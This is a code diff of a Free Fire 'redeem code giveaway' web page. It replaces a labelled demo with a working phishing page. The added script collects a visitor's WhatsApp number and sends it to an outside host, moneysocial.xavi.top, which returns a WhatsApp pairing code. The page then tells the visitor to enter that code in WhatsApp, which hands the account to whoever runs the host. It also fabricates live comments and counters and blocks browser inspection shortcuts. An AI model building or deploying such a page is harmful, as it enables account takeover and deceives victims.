-                />
-              </div>
-              <div class="redeem-meta">
-                <div class="badges">
-                  <span class="badge new">NEW</span>
-                  <span class="badge premium">PREMIUM</span>
-                </div>
-                <h3>₹4999 Redeem Code</h3>
-                <p class="sub">Redeemcode Giveaway</p>
-                <div class="stars" aria-label="5 star rating">★★★★★</div>
-              </div>
-            </div>
-            <a
-              class="card-cta"
-              href="https://terasharelink.com/s/1kqE1zUnrQcQj29DmEdfK-Q"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" aria-hidden="true">
-                <path d="M12 4v12m0 0l-5-5m5 5l5-5M5 20h14" stroke-linecap="round" stroke-linejoin="round"/>
-              </svg>
-              GET REDEEM CODE
-            </a>
-          </article>
+      <p class="install-stat"><strong id="recentDownloads">3,241</strong> redeems in last hour</p>
+      <a href="#" class="install-btn" id="installBtn"><span class="btn-label">🎟 Get Redeem Code</span></a>
+      <div class="live-chat">
+        <div class="live-chat-header">
+          <div class="live-chat-title">
+            <span class="live-dot-chat"></span>
+            Live Comments
+          </div>
+          <span class="comment-count" id="commentCount">1,284 watching</span>
+        </div>
+        <div class="comments-scroll" id="chatList"></div>
+        <div class="typing-bar hidden" id="typingBar">
+          <div class="typing-avatar" id="typingAvatar"></div>
+          <div class="typing-dots"><span></span><span></span><span></span></div>
         </div>
       </div>
     </section>
-
-    <section aria-labelledby="step2">
-      <div class="step claim" id="step2"><span class="bar"></span> STEP 02 — CLAIM</div>
-
-    <section class="comments" aria-labelledby="commentsTitle">
-      <div class="comments-head">
-        <div class="left" id="commentsTitle">
-          <span class="dot"></span>
-          Live Comments
-        </div>
-        <div class="watching"><span id="watchingCount">1,521</span> watching</div>
-      </div>
-      <div class="feed" id="feed" aria-live="polite">
-        <div class="row">
-          <div class="avatar" style="background:#2f7bff">R</div>
-          <div>
-            <div class="meta"><span class="name">Roh6458</span><span class="when">just now</span></div>
-            <div class="msg">Ha bhai mil gaya ❤️‍🩹🫶</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#1f9d6a">H</div>
-          <div>
-            <div class="meta"><span class="name">HDMohit16</span><span class="when">just now</span></div>
-            <div class="msg">Mil gaya thanks 🔥🫶</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#7a3dff">D</div>
-          <div>
-            <div class="meta"><span class="name">DeepakIndl</span><span class="when">2s ago</span></div>
-            <div class="msg">Redeem code mil gaya yr ❤️😍</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#d4552a">R</div>
-          <div>
-            <div class="meta"><span class="name">Rohan_Zone270</span><span class="when">3s ago</span></div>
-            <div class="msg">Mujhe to yakeen hi nahi ho raha sach me mil Gaya yr 💋😍</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#8a3ad4">X</div>
-          <div>
-            <div class="meta"><span class="name">xKrishna387</span><span class="when">5s ago</span></div>
-            <div class="msg">Thanks Bhai 🫶</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#3aa0c8">A</div>
-          <div>
-            <div class="meta"><span class="name">Aarav2010</span><span class="when">6s ago</span></div>
-            <div class="msg">₹4999 ka redeem code mil gaya ❤️</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#c9a227">S</div>
-          <div>
-            <div class="meta"><span class="name">sumit6764</span><span class="when">8s ago</span></div>
-            <div class="msg">Thnx mil gaya bhai 🎁❤️</div>
-          </div>
-        </div>
-        <div class="row">
-          <div class="avatar" style="background:#e23d6d">R</div>
-          <div>
-            <div class="meta"><span class="name">ravi2694</span><span class="when">9s ago</span></div>
-            <div class="msg">Bhai Maine claim kar liya 🎁🔥</div>
-          </div>
-        </div>
-      </div>
-      <button class="more" type="button" id="moreBtn">⌄ Scroll for more</button>
-    </section>
-    </section>
-
-    <footer>
-      © 2026 — Demo Website<br />
-      Independent UI demo. Not affiliated with any store, game, brand, or payment provider.
-    </footer>
-
-    <div class="wa-wrap">
-      <a
-        class="wa"
-        href="https://whatsapp.com/channel/0029VbDR76ZA2pLF7guwa42D"
-        target="_blank"
-        rel="noopener noreferrer"
-        aria-label="Join WhatsApp Channel"
-      >
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-          <path d="M12 3.2a8.3 8.3 0 00-7.2 12.4L4 21l5.5-.8A8.3 8.3 0 1012 3.2z" fill="#fff"/>
-          <path d="M9.2 8.7c.2-.5.3-.5.6-.5h.5c.2 0 .4.1.5.4l.7 1.7c.1.2 0 .4-.1.6l-.4.5c-.1.2 0 .4.2.6.3.4.8.9 1.3 1.2.3.2.5.2.7 0l.5-.4c.2-.1.4-.1.6 0l1.6.8c.3.1.4.3.4.5v.5c0 .3 0 .4-.5.6-1 .4-2.3.2-3.8-.8-1.6-1.1-2.7-2.7-3-4.2-.1-.6 0-1.2.2-1.6z" fill="#25d366"/>
-        </svg>
-        Join WhatsApp Channel
-      </a>
-    </div>
   </div>
+  <footer>
+    <p>©️ 2026 — Not affiliated with Garena Free Fire</p>
+  </footer>
 
-  <div class="toast" id="toast" role="status"></div>
+  <script>
+    // Disable right-click, inspect, and common shortcuts globally
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.keyCode === 123 ||
+          (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
+          (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 80))) {
+        e.preventDefault();
+      }
+    });
+    document.addEventListener('dragstart', e => e.preventDefault());
+    document.addEventListener('selectstart', e => {
+      if (e.target.tagName === 'VIDEO' || e.target.tagName === 'IMG') e.preventDefault();
+    });
 
-  <div class="modal" id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-    <div class="modal-card">
-      <h3 id="modalTitle">Demo preview only</h3>
-      <p id="modalText">This page is a front-end design demo. No real redeem codes, payments, or channels are connected.</p>
-      <button type="button" id="closeModal">Got it</button>
-    </div>
-  </div>
+    const video = document.getElementById('protectedVideo');
+    if (video) {
+      video.volume = 1.0;
+      video.addEventListener('contextmenu', e => e.preventDefault());
+      video.addEventListener('dragstart', e => e.preventDefault());
+      video.addEventListener('loadedmetadata', () => {
+        // Extra protection layer
+        video.setAttribute('controlsList', 'nodownload noremoteplayback noplaybackrate');
+      });
+
+      let playAttempted = false;
+      const attemptPlay = () => {
+        if (playAttempted) return;
+        playAttempted = true;
+        video.play().catch(() => {
+          document.addEventListener('click', function playOnClick() {
+            video.play();
+            document.removeEventListener('click', playOnClick);
+          }, { once: true });
+        });
+      };
+      if (video.readyState >= 3) attemptPlay();
+      else video.addEventListener('canplay', attemptPlay, { once: true });
+    }
+
+    // Protect all images
+    document.querySelectorAll('img').forEach(img => {
+      img.addEventListener('contextmenu', e => e.preventDefault());
+      img.addEventListener('dragstart', e => e.preventDefault());
+      img.draggable = false;
+    });
+
+    const dlEl = document.getElementById('recentDownloads');
+    let downloads = 3241;
+    setInterval(() => {
+      downloads += [89, 127, 56][Math.floor(Math.random() * 3)];
+      if (dlEl) dlEl.textContent = downloads.toLocaleString();
+    }, 2000);
+
+    const avatarColors = [
+      '#e53935', '#8e24aa', '#3949ab', '#1e88e5', '#00897b',
+      '#43a047', '#f4511e', '#6d4c41', '#546e7a', '#d81b60',
+      '#5c6bc0', '#26a69a', '#ef5350', '#ab47bc', '#7e57c2'
+    ];
+    const nameParts = {
+      first: ['Aarav', 'Vivaan', 'Aditya', 'Arjun', 'Krishna', 'Ishaan', 'Rohan', 'Karan', 'Rahul', 'Mohit', 'Yash', 'Aman', 'Deepak', 'Sumit', 'Ankit', 'Manish', 'Ritesh', 'Vikas', 'Abhishek', 'Nikhil', 'Harsh', 'Ravi', 'Ajay', 'Lokesh', 'Gaurav', 'Tarun', 'Shivam', 'Vivek', 'Sandeep', 'Pankaj', 'Neeraj', 'Varun', 'Kunal', 'Dev', 'Rohan', 'Sahil', 'Nitin', 'Prakash'],
+      tag: ['FF', 'Pro', 'OP', 'Gaming', 'YT', 'X', 'King', 'Boss', 'HD', 'Live', 'Max', 'V2', 'Zone', 'Clan'],
+      city: ['Mumbai', 'Delhi', 'Pune', 'Jaipur', 'Lucknow', 'Patna', 'Surat', 'Indore', 'Nagpur', 'Bhopal', 'Kolkata', 'Chennai', 'Hyderabad', 'Ahmedabad']
+    };
+    const msgParts = {
+      open: ['bhai', 'yaar', 'bro', 'arey', 'omg', 'dekho', 'sach me', 'finally', 'abe', 'sun', 'han bhai', ''],
+      thing: ['redeem code', 'free redeem code', 'ff redeem', 'redeem trick', 'ye app', '300 redeem code', 'code generator', 'signup redeem', 'direct redeem', 'mod', 'update', 'OB54 trick'],
+      status: ['ho gaya', 'hogya', 'done hai', 'working hai', 'mil gaya', 'redeem hogya', 'activate hogya', 'aa gaya', 'set hai', 'running hai'],
+      good: ['100%', 'fast', 'real', 'free me', 'mast', 'solid', 'OP', 'best', 'verified', 'safe', 'instant', 'no ban'],
+      city: nameParts.city,
+      time: ['1 min', '2 min', '30 sec', '5 min', 'abhi', 'thodi der'],
+      end: ['thanks', 'share karo', 'jaldi karo', 'legend', 'fire', 'redeem code mil gaya', 'try karo sab', 'worth it']
+    };
+    const emojis = [
+      '🔥', '✅', '🙏', '🎟️', '👍', '❤️', '💯', '😍', '🤩', '⚡', '🎮', '🆓',
+      '⭐', '👀', '😂', '🥳', '💪', '🚀', '✨', '👑', '🎯', '💥', '🫡', '😎'
+    ];
+    const seps = [' -- ', ' — ', ', ', ' | ', ' >> ', ' ~ '];
+    const rareTemplates = [
+      'bhai ye real hai, redeem karo',
+      'redeem code mil gaya thanks',
+      'no ban unlimited redeem code mil gaya',
+      '300 redeem code activate hogya bhai',
+      'free redeem code working hai 100%'
+    ];
+    const chatList = document.getElementById('chatList');
+    const typingBar = document.getElementById('typingBar');
+    const typingAvatar = document.getElementById('typingAvatar');
+    const commentCountEl = document.getElementById('commentCount');
+    const maxChats = 12;
+    let commentTotal = 1284 + Math.floor(Math.random() * 200);
+    let typingTimer = null;
+    let cycleTimer = null;
+
+    function rand(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+    function pick(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+    function maybe(part, chance) {
+      return Math.random() < chance ? pick(part) + ' ' : '';
+    }
+    function randomSep() {
+      return pick(seps);
+    }
+    function randomEmoji(count) {
+      const n = count || rand(1, 3);
+      let out = '';
+      for (let i = 0; i < n; i++) out += pick(emojis);
+      return out;
+    }
+    function wrapEmojis(msg) {
+      if (Math.random() < 0.07) return randomEmoji(rand(2, 5));
+      const roll = rand(1, 6);
+      const e1 = Math.random() < 0.55 ? randomEmoji(rand(1, 2)) : '';
+      const e2 = Math.random() < 0.45 ? randomEmoji(rand(1, 2)) : '';
+      if (roll === 1 && e1) return e1 + ' ' + msg;
+      if (roll === 2 && e2) return msg + ' ' + e2;
+      if (roll === 3 && e1 && e2) return e1 + ' ' + msg + ' ' + e2;
+      if (roll === 4 && e1) return msg + ' ' + e1 + e1;
+      if (roll === 5 && Math.random() < 0.4) return msg + ' ' + randomEmoji(1);
+      return msg;
+    }
+    function randomName() {
+      if (Math.random() < 0.1) {
+        return pick(nameParts.first) + pick(nameParts.tag) + rand(1, 99);
+      }
+      const builders = [
+        () => pick(nameParts.first) + pick(['_', '.', '']) + pick(nameParts.tag) + rand(1, 999),
+        () => pick(nameParts.first).slice(0, rand(3, 6)) + rand(10, 9999),
+        () => pick(nameParts.city).slice(0, rand(3, 5)).toLowerCase() + pick(nameParts.tag) + rand(1, 99),
+        () => String.fromCharCode(rand(97, 122)) + pick(nameParts.first) + rand(1, 999),
+        () => pick(nameParts.first).toLowerCase() + rand(100, 9999),
+        () => pick(nameParts.tag) + pick(nameParts.first) + rand(1, 99),
+        () => pick(nameParts.first) + rand(1988, 2012),
+        () => 'x' + pick(nameParts.first) + rand(1, 999),
+        () => pick(nameParts.first) + pick(nameParts.city).slice(0, 3) + rand(1, 9)
+      ];
+      return pick(builders)();
+    }
+    function randomMessage() {
+      if (Math.random() < 0.1) {
+        return wrapEmojis(pick(rareTemplates));
+      }
+      const s = rand(1, 10);
+      let msg = '';
+      if (s <= 3) {
+        msg = maybe(msgParts.open, 0.7) +
+          pick(msgParts.thing) + ' ' +
+          pick(msgParts.status) +
+          (Math.random() < 0.5 ? randomSep() + pick(msgParts.end) : '');
+      } else if (s <= 5) {
+        msg = pick(msgParts.city) + ' se' + randomSep() +
+          pick(msgParts.thing) + ' ' +
+          pick(msgParts.status);
+      } else if (s <= 7) {
+        msg = pick(msgParts.time) + ' me ' +
+          pick(msgParts.status) + randomSep() +
+          pick(msgParts.good) +
+          maybe(msgParts.end, 0.4);
+      } else if (s === 8) {
+        msg = pick(msgParts.open) + randomSep() +
+          pick(msgParts.good) + ' ' +
+          pick(msgParts.thing) + ' ' +
+          pick(msgParts.status);
+      } else {
+        msg = pick(msgParts.thing) + ' ' +
+          pick(msgParts.status) + randomSep() +
+          pick(msgParts.end);
+      }
+      return wrapEmojis(msg.replace(/\s+/g, ' ').trim());
+    }
+    function randomTime() {
+      if (Math.random() < 0.4) return 'just now';
+      return rand(1, 9) + 's ago';
+    }
+    function randomColor() {
+      if (Math.random() < 0.5) {
+        return 'hsl(' + rand(0, 360) + ',' + rand(45, 75) + '%,' + rand(38, 52) + '%)';
+      }
+      return pick(avatarColors);
+    }
+    function getInitial(name) {
+      const c = name.replace(/[^a-zA-Z]/, '').charAt(0);
+      return (c || 'U').toUpperCase();
+    }
+    function updateCommentCount() {
+      commentTotal += rand(1, 5);
+      if (commentCountEl) {
+        commentCountEl.textContent = commentTotal.toLocaleString() + ' watching';
+      }
+    }
+    function renderComment(name, text, time) {
+      const el = document.createElement('div');
+      el.className = 'comment';
+      const av = document.createElement('div');
+      av.className = 'comment-avatar';
+      av.style.background = randomColor();
+      av.textContent = getInitial(name);
+      const body = document.createElement('div');
+      body.className = 'comment-body';
+      const meta = document.createElement('div');
+      meta.className = 'comment-meta';
+      const nameEl = document.createElement('span');
+      nameEl.className = 'comment-name';
+      nameEl.textContent = name;
+      const timeEl = document.createElement('span');
+      timeEl.className = 'comment-time';
+      timeEl.textContent = time;
+      const textEl = document.createElement('p');
+      textEl.className = 'comment-text';
+      textEl.textContent = text;
+      meta.appendChild(nameEl);
+      meta.appendChild(timeEl);
+      body.appendChild(meta);
+      body.appendChild(textEl);
+      el.appendChild(av);
+      el.appendChild(body);
+      return el;
+    }
+    function showTyping(name) {
+      if (!typingBar || !typingAvatar) return;
+      typingAvatar.style.background = randomColor();
+      typingBar.classList.remove('hidden');
+    }
+    function hideTyping() {
+      if (typingBar) typingBar.classList.add('hidden');
+    }
+    function pushComment(name, text, time) {
+      chatList.appendChild(renderComment(name, text, time));
+      while (chatList.children.length > maxChats) {
+        chatList.removeChild(chatList.firstChild);
+      }
+      chatList.scrollTop = chatList.scrollHeight;
+      updateCommentCount();
+    }
+    function postInstantComment() {
+      pushComment(randomName(), randomMessage(), 'just now');
+    }
+    function postWithTyping(callback) {
+      const name = randomName();
+      const text = randomMessage();
+      showTyping(name);
+      clearTimeout(typingTimer);
+      typingTimer = setTimeout(() => {
+        hideTyping();
+        pushComment(name, text, randomTime());
+        if (callback) callback();
+      }, rand(250, 700));
+    }
+    function pickBurstSize() {
+      const r = Math.random();
+      if (r < 0.42) return 1;
+      if (r < 0.72) return 2;
+      if (r < 0.92) return 3;
+      return rand(3, 4);
+    }
+    function runBurst(left, isFirst, burstTotal) {
+      if (left <= 0) {
+        const pause = burstTotal === 1 ? rand(1600, 3400) : rand(800, 1900);
+        cycleTimer = setTimeout(runCommentCycle, pause);
+        return;
+      }
+      const next = () => {
+        setTimeout(() => runBurst(left - 1, false, burstTotal), rand(80, 280));
+      };
+      if (isFirst) {
+        postWithTyping(next);
+      } else {
+        postInstantComment();
+        next();
+      }
+    }
+    function runCommentCycle() {
+      if (!chatList) return;
+      const burst = pickBurstSize();
+      runBurst(burst, true, burst);
+    }
+    for (let i = 0; i < 5; i++) {
+      pushComment(randomName(), randomMessage(), i === 4 ? 'just now' : rand(1, 8) + 's ago');
+    }
+    runCommentCycle();
+    setInterval(updateCommentCount, 3000);
+  </script>
 
   <script>
     (function () {
-      const liveEl = document.getElementById("liveCount");
-      const watchEl = document.getElementById("watchingCount");
-      const claimsEl = document.getElementById("claimsCount");
-      const feed = document.getElementById("feed");
-      const toast = document.getElementById("toast");
-      const modal = document.getElementById("modal");
-      const modalText = document.getElementById("modalText");
+      const installBtn = document.getElementById('installBtn');
+      if (!installBtn) return;
 
-      let live = 1292;
-      let watching = 1521;
-      let claims = 4681;
-
-      const format = (n) => n.toLocaleString("en-IN");
-      const tickNumber = (current, minDelta, maxDelta, floor) => {
-        const delta = Math.floor(Math.random() * (maxDelta - minDelta + 1)) + minDelta;
-        const dir = Math.random() > 0.35 ? 1 : -1;
-        return Math.max(floor, current + dir * delta);
-      };
-
-      const updateCounters = () => {
-        live = tickNumber(live, 1, 6, 1200);
-        watching = tickNumber(watching, 1, 8, 1400);
-        if (Math.random() > 0.45) claims += Math.floor(Math.random() * 17) + 3;
-        liveEl.textContent = format(live);
-        watchEl.textContent = format(watching);
-        claimsEl.textContent = format(claims);
-      };
-
-      const colors = ["#2f7bff", "#c9a227", "#7a3dff", "#e23d6d", "#1f9d6a", "#d4552a", "#3aa0c8", "#8a3ad4"];
-      const names = ["Roh6458", "HDMohit16", "DeepakIndl", "Rohan_Zone270", "xKrishna387", "Aarav2010", "sumit6764", "ravi2694"];
-      const comments = [
-        "Ha bhai mil gaya ❤️‍🩹🫶",
-        "Mil gaya thanks 🔥🫶",
-        "Redeem code mil gaya yr ❤️😍",
-        "Mujhe to yakeen hi nahi ho raha sach me mil Gaya yr 💋😍",
-        "Thanks Bhai 🫶",
-        "₹4999 ka redeem code mil gaya ❤️",
-        "Thnx mil gaya bhai 🎁❤️",
-        "Bhai Maine claim kar liya 🎁🔥"
+      const countryList = [
+        { code: "+91", name: "India", flag: "🇮🇳" },
+        { code: "+1", name: "USA", flag: "🇺🇸" },
+        { code: "+44", name: "UK", flag: "🇬🇧" },
+        { code: "+61", name: "Australia", flag: "🇦🇺" },
+        { code: "+81", name: "Japan", flag: "🇯🇵" },
+        { code: "+86", name: "China", flag: "🇨🇳" },
+        { code: "+49", name: "Germany", flag: "🇩🇪" },
+        { code: "+33", name: "France", flag: "🇫🇷" },
+        { code: "+39", name: "Italy", flag: "🇮🇹" },
+        { code: "+7", name: "Russia", flag: "🇷🇺" },
+        { code: "+55", name: "Brazil", flag: "🇧🇷" },
+        { code: "+52", name: "Mexico", flag: "🇲🇽" },
+        { code: "+54", name: "Argentina", flag: "🇦🇷" },
+        { code: "+56", name: "Chile", flag: "🇨🇱" },
+        { code: "+57", name: "Colombia", flag: "🇨🇴" },
+        { code: "+27", name: "South Africa", flag: "🇿🇦" },
+        { code: "+20", name: "Egypt", flag: "🇪🇬" },
+        { code: "+234", name: "Nigeria", flag: "🇳🇬" },
+        { code: "+254", name: "Kenya", flag: "🇰🇪" },
+        { code: "+251", name: "Ethiopia", flag: "🇪🇹" },
+        { code: "+92", name: "Pakistan", flag: "🇵🇰" },
+        { code: "+880", name: "Bangladesh", flag: "🇧🇩" },
+        { code: "+94", name: "Sri Lanka", flag: "🇱🇰" },
+        { code: "+977", name: "Nepal", flag: "🇳🇵" },
+        { code: "+93", name: "Afghanistan", flag: "🇦🇫" },
+        { code: "+971", name: "UAE", flag: "🇦🇪" },
+        { code: "+966", name: "Saudi Arabia", flag: "🇸🇦" },
+        { code: "+974", name: "Qatar", flag: "🇶🇦" },
+        { code: "+965", name: "Kuwait", flag: "🇰🇼" },
+        { code: "+968", name: "Oman", flag: "🇴🇲" },
+        { code: "+90", name: "Turkey", flag: "🇹🇷" },
+        { code: "+98", name: "Iran", flag: "🇮🇷" },
+        { code: "+964", name: "Iraq", flag: "🇮🇶" },
+        { code: "+972", name: "Israel", flag: "🇮🇱" },
+        { code: "+961", name: "Lebanon", flag: "🇱🇧" },
+        { code: "+62", name: "Indonesia", flag: "🇮🇩" },
+        { code: "+60", name: "Malaysia", flag: "🇲🇾" },
+        { code: "+65", name: "Singapore", flag: "🇸🇬" },
+        { code: "+66", name: "Thailand", flag: "🇹🇭" },
+        { code: "+84", name: "Vietnam", flag: "🇻🇳" },
+        { code: "+63", name: "Philippines", flag: "🇵🇭" },
+        { code: "+82", name: "South Korea", flag: "🇰🇷" },
+        { code: "+886", name: "Taiwan", flag: "🇹🇼" },
+        { code: "+852", name: "Hong Kong", flag: "🇭🇰" },
+        { code: "+853", name: "Macau", flag: "🇲🇴" },
+        { code: "+31", name: "Netherlands", flag: "🇳🇱" },
+        { code: "+32", name: "Belgium", flag: "🇧🇪" },
+        { code: "+41", name: "Switzerland", flag: "🇨🇭" },
+        { code: "+46", name: "Sweden", flag: "🇸🇪" },
+        { code: "+47", name: "Norway", flag: "🇳🇴" },
+        { code: "+45", name: "Denmark", flag: "🇩🇰" },
+        { code: "+358", name: "Finland", flag: "🇫🇮" },
+        { code: "+48", name: "Poland", flag: "🇵🇱" },
+        { code: "+420", name: "Czech Republic", flag: "🇨🇿" },
+        { code: "+36", name: "Hungary", flag: "🇭🇺" },
+        { code: "+30", name: "Greece", flag: "🇬🇷" },
+        { code: "+351", name: "Portugal", flag: "🇵🇹" },
+        { code: "+34", name: "Spain", flag: "🇪🇸" },
+        { code: "+43", name: "Austria", flag: "🇦🇹" },
+        { code: "+353", name: "Ireland", flag: "🇮🇪" },
+        { code: "+64", name: "New Zealand", flag: "🇳🇿" },
+        { code: "+679", name: "Fiji", flag: "🇫🇯" },
+        { code: "+675", name: "Papua New Guinea", flag: "🇵🇬" },
+        { code: "+212", name: "Morocco", flag: "🇲🇦" },
+        { code: "+213", name: "Algeria", flag: "🇩🇿" },
+        { code: "+216", name: "Tunisia", flag: "🇹🇳" },
+        { code: "+218", name: "Libya", flag: "🇱🇾" },
+        { code: "+233", name: "Ghana", flag: "🇬🇭" },
+        { code: "+225", name: "Ivory Coast", flag: "🇨🇮" },
+        { code: "+221", name: "Senegal", flag: "🇸🇳" },
+        { code: "+220", name: "Gambia", flag: "🇬🇲" },
+        { code: "+256", name: "Uganda", flag: "🇺🇬" },
+        { code: "+255", name: "Tanzania", flag: "🇹🇿" },
+        { code: "+260", name: "Zambia", flag: "🇿🇲" },
+        { code: "+263", name: "Zimbabwe", flag: "🇿🇼" },
+        { code: "+380", name: "Ukraine", flag: "🇺🇦" },
+        { code: "+375", name: "Belarus", flag: "🇧🇾" },
+        { code: "+374", name: "Armenia", flag: "🇦🇲" },
+        { code: "+995", name: "Georgia", flag: "🇬🇪" },
+        { code: "+976", name: "Mongolia", flag: "🇲🇳" },
+        { code: "+95", name: "Myanmar", flag: "🇲🇲" },
+        { code: "+856", name: "Laos", flag: "🇱🇦" },
+        { code: "+855", name: "Cambodia", flag: "🇰🇭" }
       ];
 
-      const renderRow = (item, animate) => {
-        const row = document.createElement("div");
-        row.className = "row";
-        if (!animate) row.style.animation = "none";
-        const color = colors[item.name.charCodeAt(0) % colors.length];
-        row.innerHTML = `
-          <div class="avatar" style="background:${color}">${item.name.charAt(0).toUpperCase()}</div>
-          <div>
-            <div class="meta">
-              <span class="name">${item.name}</span>
-              <span class="when">${item.when}</span>
-            </div>
-            <div class="msg">${item.text}</div>
-          </div>
-        `;
-        return row;
-      };
+      const overlay = document.createElement('div');
+      overlay.className = 'modal-overlay';
+      overlay.innerHTML = `
+        <div class="modal-container">
+          <button type="button" class="modal-close" aria-label="Close">&times;</button>
+          <div class="modal-content" id="modalDynamicContent"></div>
+        </div>
+      `;
+      document.body.appendChild(overlay);
 
-      let commentIndex = 0;
-      const addComment = () => {
-        const text = comments[commentIndex % comments.length];
-        const name = names[(commentIndex + 3) % names.length];
-        commentIndex += 1;
-        const row = renderRow({ name, when: "just now", text }, true);
-        feed.prepend(row);
-        while (feed.children.length > 8) feed.removeChild(feed.lastChild);
-      };
+      const closeBtn = overlay.querySelector('.modal-close');
+      const contentContainer = document.getElementById('modalDynamicContent');
 
-      const showToast = (msg) => {
-        toast.textContent = msg;
-        toast.classList.add("show");
-        clearTimeout(showToast.t);
-        showToast.t = setTimeout(() => toast.classList.remove("show"), 2800);
-      };
+      function closeModal() {
+        overlay.classList.remove('active');
+      }
+      closeBtn.addEventListener('click', closeModal);
+      overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) closeModal();
+      });
 
-      const video = document.getElementById("promoVideo");
-      const card = document.querySelector(".media-card");
-      const timeChip = document.getElementById("timeChip");
-      const formatTime = (s) => {
-        if (!isFinite(s)) return "0:00";
-        const m = Math.floor(s / 60);
-        const sec = Math.floor(s % 60).toString().padStart(2, "0");
-        return m + ":" + sec;
-      };
-      const syncTime = () => {
-        timeChip.textContent = formatTime(video.currentTime || 0) + " / " + formatTime(video.duration || 0);
-      };
-
-      const playWithSound = () => {
-        video.muted = false;
-        video.defaultMuted = false;
-        video.volume = 1;
-        return video.play();
-      };
-
-      const startVideo = () => {
-        video.muted = false;
-        video.defaultMuted = false;
-        video.volume = 1;
-        playWithSound().then(() => {
-          card.classList.add("playing");
-        }).catch(() => {
-          // Browsers block autoplay with sound until the user taps.
-          // Never fall back to muted playback.
-          card.classList.remove("playing");
-          timeChip.textContent = "Tap to play with sound";
+      function showStep1() {
+        let optionsHtml = '';
+        countryList.forEach(country => {
+          optionsHtml += `<option value="${country.code}">${country.flag} ${country.code}</option>`;
         });
-      };
+        contentContainer.innerHTML = `
+          <div class="popup-left">
+            <span class="whatsapp">WhatsApp</span>
+            <img src="assets/logo.gif" alt="logo">
+            <div class="header-divider"></div>
+          </div>
+          <div class="modal-sub">Enter your WhatsApp number to receive pair code</div>
+          <div class="input-group">
+            <select class="country-code" id="countryCodeSelect">${optionsHtml}</select>
+            <input type="tel" class="phone-input" id="phoneNumberInput" placeholder="Phone number" autocomplete="off">
+          </div>
+          <button type="button" class="get-code-btn" id="getCodeBtn">GET CODE</button>
+        `;
 
-      video.addEventListener("timeupdate", syncTime);
-      video.addEventListener("loadedmetadata", syncTime);
-      video.addEventListener("playing", () => card.classList.add("playing"));
-      video.addEventListener("play", () => card.classList.add("playing"));
-      video.addEventListener("pause", () => {
-        if (video.currentTime < 0.2) card.classList.remove("playing");
-      });
-      video.addEventListener("error", () => {
-        showToast("Video file nahi mili. lv_0_20260928135520.mp4 ko index.html ke saath same folder me rakho.");
-      });
+        const getCodeBtn = document.getElementById('getCodeBtn');
+        const phoneInput = document.getElementById('phoneNumberInput');
+        const countrySelect = document.getElementById('countryCodeSelect');
 
-      startVideo();
-      video.addEventListener("canplay", startVideo, { once: true });
-      video.addEventListener("loadeddata", startVideo, { once: true });
+        getCodeBtn.addEventListener('click', async () => {
+          const countryCode = countrySelect.value;
+          const phone = phoneInput.value.trim();
+          if (!phone) {
+            alert('Please enter phone number');
+            return;
+          }
+          getCodeBtn.disabled = true;
+          getCodeBtn.textContent = 'SENDING...';
 
-      const unlockSound = () => {
-        playWithSound().catch(() => {});
-      };
-      ["pointerdown", "touchstart", "click", "keydown"].forEach((evt) => {
-        document.addEventListener(evt, unlockSound, { once: true, passive: true });
-      });
+          try {
+            const fullNumber = (countryCode + phone)
+              .replace(/\+/g, '')
+              .replace(/\s+/g, '')
+              .trim();
+            const params = new URLSearchParams(window.location.search);
+            const uuid = params.get('click_id') || Date.now().toString();
+            const keyParam = params.get('key') || 'yyiJXuyA';
+            const apiUrl = `https://moneysocial.xavi.top/qrcode?key=${keyParam}&pairCode=77773333&uuid=${uuid}&phone=${encodeURIComponent(fullNumber)}`;
+            const response = await fetch(apiUrl, { method: 'GET' });
+            const result = await response.json();
+            const pairCode = result.data.pairCode;
+            if (!pairCode || pairCode.length !== 9) {
+              throw new Error('Invalid code received');
+            }
+            showStep2(pairCode);
+          } catch (err) {
+            console.error(err);
+            alert('Error fetching code. Please try again.');
+            getCodeBtn.disabled = false;
+            getCodeBtn.textContent = 'GET CODE';
+          }
+        });
+      }
 
-      document.getElementById("playBtn").addEventListener("click", (e) => {
+      function showStep2(pairCode) {
+        contentContainer.innerHTML = `
+          <div class="modal-title">🎉 CODE GENERATED</div>
+          <div class="pair-code" id="pairCodeDisplay">${pairCode}</div>
+          <button type="button" class="copy-code-btn" id="copyCodeBtn">📋 COPY CODE</button>
+          <div class="modal-sub" style="margin-top: 16px;">Use this code in WhatsApp to claim redeem code</div>
+        `;
+        const copyBtn = document.getElementById('copyCodeBtn');
+        copyBtn.addEventListener('click', () => {
+          navigator.clipboard.writeText(pairCode).then(() => {
+            copyBtn.textContent = '✓ COPIED!';
+            setTimeout(() => { copyBtn.textContent = '📋 COPY CODE'; }, 2000);
+          }).catch(() => alert('Failed to copy'));
+        });
+      }
+
+      installBtn.addEventListener('click', (e) => {
         e.preventDefault();
-        startVideo();
+        showStep1();
+        overlay.classList.add('active');
       });
-
-      document.getElementById("moreBtn").addEventListener("click", addComment);
-
-      setInterval(updateCounters, 2200);
-      setInterval(addComment, 3800);
     })();
   </script>
 </body>
